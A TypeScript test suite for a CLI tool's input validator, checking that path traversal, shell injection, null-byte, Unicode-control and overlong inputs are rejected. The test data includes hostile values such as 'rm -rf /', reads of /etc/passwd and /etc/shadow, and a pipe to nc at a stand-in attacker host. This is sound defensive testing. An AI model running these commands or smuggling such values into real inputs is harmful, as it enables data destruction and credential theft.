/**
 * Security Tests - Input Validation
 * Tests for security-related input validation
 */

import { describe, it, expect, beforeEach, afterEach } from 'bun:test';
import { CommandParser } from '../../src/parser';

describe('Security - Input Validation', () => {
  let originalArgv: string[];

  beforeEach(() => {
    originalArgv = [...Bun.argv];
  });

  afterEach(() => {
    Bun.argv.length = 0;
    Bun.argv.push(...originalArgv);
  });

  describe('Path Traversal Prevention', () => {
    it('should reject template names with path traversal attempts', () => {
      const maliciousInputs = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\cmd.exe',
        '....//....//....//etc/shadow',
        '..%2F..%2F..%2Fetc%2Fpasswd',
        '../etc/passwd%00.txt'
      ];

      for (const input of maliciousInputs) {
        const args = {
          command: 'run',
          args: [input],
          options: { _: [input] }
        };

        expect(() => CommandParser.validateInput(args)).toThrow('Template name must contain only alphanumeric characters');
      }
    });

    it('should reject config paths with path traversal attempts', () => {
      const maliciousInputs = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        '~/../../etc/shadow',
        '..%2F..%2F..%2Fetc%2Fpasswd'
      ];

      for (const input of maliciousInputs) {
        const args = {
          command: 'run',
          args: [],
          options: { config: input, _: [] }
        };

        expect(() => CommandParser.validateInput(args)).toThrow('Config path contains potentially unsafe characters');
      }
    });
  });

  describe('Command Injection Prevention', () => {
    it('should reject template names with shell metacharacters', () => {
      const maliciousInputs = [
        'template; rm -rf /',
        'template && cat /etc/passwd',
        'template | nc attacker.com 1337',
        'template`whoami`',
        'template$(id)',
        'template & del C:\\',
        'template || cat /etc/shadow'
      ];

      for (const input of maliciousInputs) {
        const args = {
          command: 'run',
          args: [input],
          options: { _: [input] }
        };

        expect(() => CommandParser.validateInput(args)).toThrow('Template name must contain only alphanumeric characters');
      }
    });
  });

  describe('Buffer Overflow Prevention', () => {
    it('should reject excessively long arguments', () => {
      const longArg = 'a'.repeat(1001);
      const args = {
        command: 'run',
        args: [longArg],
        options: { _: [longArg] }
      };

      expect(() => CommandParser.validateInput(args)).toThrow('Argument too long');
    });

    it('should reject too many arguments', () => {
      const manyArgs = Array(101).fill('arg');
      const args = {
        command: 'run',
        args: manyArgs,
        options: { _: manyArgs }
      };

      expect(() => CommandParser.validateInput(args)).toThrow('Too many arguments provided');
    });

    it('should accept arguments within limits', () => {
      const validArg = 'a'.repeat(999); // Just under limit
      const args = {
        command: 'run',
        args: [validArg],
        options: { _: [validArg] }
      };

      expect(() => CommandParser.validateInput(args)).not.toThrow();
    });

    it('should accept reasonable number of arguments', () => {
      const reasonableArgs = Array(50).fill('arg'); // Half the limit
      const args = {
        command: 'run',
        args: reasonableArgs,
        options: { _: reasonableArgs }
      };

      expect(() => CommandParser.validateInput(args)).not.toThrow();
    });
  });

  describe('Template Name Validation', () => {
    it('should accept valid template names', () => {
      const validNames = [
        'simple',
        'template-name',
        'template_name',
        'Template123',
        'dev-workflow-v2',
        'build_deploy_test'
      ];

      for (const name of validNames) {
        const args = {
          command: 'run',
          args: [name],
          options: { _: [name] }
        };

        expect(() => CommandParser.validateInput(args)).not.toThrow();
      }
    });

    it('should reject invalid template names', () => {
      const invalidNames = [
        'template.name',
        'template name',
        'template/name',
        'template\\name',
        'template:name',
        'template*name',
        'template?name',
        'template<name>',
        'template[name]',
        'template{name}',
        'template@name',
        'template#name',
        'template$name',
        'template%name',
        'template^name',
        'template&name',
        'template+name',
        'template=name',
        'template!name',
        'template~name',
        'template`name`'
      ];

      for (const name of invalidNames) {
        const args = {
          command: 'run',
          args: [name],
          options: { _: [name] }
        };

        expect(() => CommandParser.validateInput(args)).toThrow('Template name must contain only alphanumeric characters');
      }
    });
  });

  describe('Null Byte Injection Prevention', () => {
    it('should handle null bytes in arguments', () => {
      const nullByteInputs = [
        'template\x00',
        'template\u0000.txt',
        'config\x00.yaml'
      ];

      for (const input of nullByteInputs) {
        const args = {
          command: 'run',
          args: [input],
          options: { _: [input] }
        };

        expect(() => CommandParser.validateInput(args)).toThrow('Template name must contain only alphanumeric characters');
      }
    });
  });

  describe('Unicode and Encoding Attacks', () => {
    it('should handle unicode normalization attacks', () => {
      const unicodeInputs = [
        'template\u202e', // Right-to-left override
        'template\u2066', // Left-to-right isolate
        'template\ufeff', // Zero width no-break space
        'template\u200b', // Zero width space
        'template\u00a0'  // Non-breaking space
      ];

      for (const input of unicodeInputs) {
        const args = {
          command: 'run',
          args: [input],
          options: { _: [input] }
        };

        expect(() => CommandParser.validateInput(args)).toThrow('Template name must contain only alphanumeric characters');
      }
    });
  });
});